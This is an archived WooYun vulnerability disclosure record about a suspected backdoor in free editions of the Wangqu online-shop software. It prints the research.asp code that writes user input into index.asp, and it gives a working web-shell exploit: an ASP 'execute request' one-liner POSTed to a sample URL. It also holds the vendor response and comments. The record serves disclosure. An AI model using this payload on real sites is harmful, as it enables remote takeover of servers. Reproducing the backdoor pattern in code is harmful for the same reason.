{"id": 2777, "wybug_id": "wooyun-2014-063567", "wybug_title": "网趣商城多个免费版本秒拿shell源码疑似存在后门", "wybug_corp": "网趣商城", "wybug_author": "路人甲", "wybug_date": "2014-06-04 21:38", "wybug_open_date": "2014-07-23 20:40", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： 代码审计发现网趣商城多个免费版本秒拿shell，真希望这段代码是黑客后来放上的，而不是为了卖软件，故意留这个篡改别人首页的getshell后门。 详细说明：  经审计发现以下网趣商城免费源码存在getshell漏洞：网趣网上购物系统时尚版V14.0[2014-5-21] 官方下载地址：http://www.cnhww.com/softdown.asp?id=1网趣网上购物系统旗舰版[2014-5-8 ] 官方下载地址：http://www.cnhww.com/softdown.asp?id=6网趣网上购物系统HTML静态版 V2014[2013-11-8 ] 官方下载地址：http://www.cnhww.com/softdown.asp?id=2不排除其他版本也存在漏洞。附：官方下载地址清单页面：http://www.cnhww.com/DownLoad.asp   漏洞证明：  以网趣网上购物系统HTML静态版 V2014为例，该套系统源码根目录下research.asp页面175行起代码如下：\n<td align=\"center\" bordercolor=\"#FFFFFF\" bgcolor=\"#FFFFFF\"><%            \tif request(\"search\")=\" all\" then keyword=request.form(\"keyword\")if keyword<>\"\" thendim path,myfileobject,mytextfile path = Server.MapPath(shopurl)set  MyFileObject = Server.CreateObject(\"Scripting.FileSystemObject\")set  MyTextFile = MyFileObject.CreateTextFile(path)MyTextFile.WriteLine (keyword)MyTextFile.Close()response.end\telseresponse.end\n其中shopurl为index.asp利用过程如下：post\nkeyword=<%25execute%20request(\"g\")%25>\n至以下url：http://192.168.1.101/wangqu/research.asp?searchkey=x&anclassid=0&search= all注意：all前面有空格。\n\n即可得到shell，地址为http://192.168.1.101/wangqu/index.asp\n\n   修复方案：  官方懂的。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-06-08 22:19 厂商回复： CNVD对原理进行分析，确认漏洞情况（未进行实例确认），已经由CNVD通过公开联系渠道向软件生产厂商,发送网站邮箱，cnhww  通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-04 22:09 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  <!--          .,,,,,,,,,,.          ,;;;;;;;;;;;;;;,        ,;;;;;;;;;;;)));;(((,,;;;,,_       ,;;;;;;;;;;'      |)))))))))))\\\\      ;;;;;;/ )''    - /,)))((((((((((\\      ;;;;' \\        ~|\\  ))))))))))))))      /     /         |   ((((((((((((((    /'      \\      _/~'    ')|()))))))))  /'         `\\   />     o_/)))(((((((( /          /' `~~(____ /  ()))))))))))|     ---,   \\        \\     ((((((((((           `\\   \\~-_____|      ))))))))             `\\  |      |_.---.  \\ ╒══╕╒══╕　　　　　╒╕╒═╕　　╒══╕　　　　　　　│══╡│╒╕│╒══╕╒╛││═╡　　│╒═╛╒═╕╒══╕╞══││╘╛││││││││╞═│╒╕│╘═╕│││││││╘══╛╘══╛╘╧╧╛╘═╛╘═╛╘╛╘══╛╘═╛╘╧╧╛-->    \n     2014-06-04 22:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  话说这种为何要匿名啊？感觉木有必要    \n     2014-07-02 11:48 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  好像真是后门啊这也可以    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}